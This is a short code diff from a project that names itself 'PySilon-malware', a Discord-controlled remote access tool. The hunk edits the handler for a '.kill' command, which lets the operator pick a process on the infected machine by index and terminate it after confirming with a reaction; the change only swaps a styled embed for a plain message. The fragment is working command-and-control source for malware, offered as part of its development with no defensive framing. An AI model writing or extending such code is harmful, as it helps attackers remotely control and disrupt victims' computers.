@@ -125,10 +125,8 @@ elif message.content[:5] == '.kill':
         #.log Checking if there is a process with provided process ID 
         if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
             #.log Found a process with provided process ID 
-            embed = discord.Embed(title="🟢 Success",description='```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```', colour=discord.Colour.green())
-            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
-            reaction_msg = await message.channel.send(embed=embed)
-            #.log Sent embed with confirmation of killing a process 
+            reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
+            #.log Sent message with confirmation of killing a process 
             process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
             await reaction_msg.add_reaction('💀')
             #.log Reacted with "kill" 
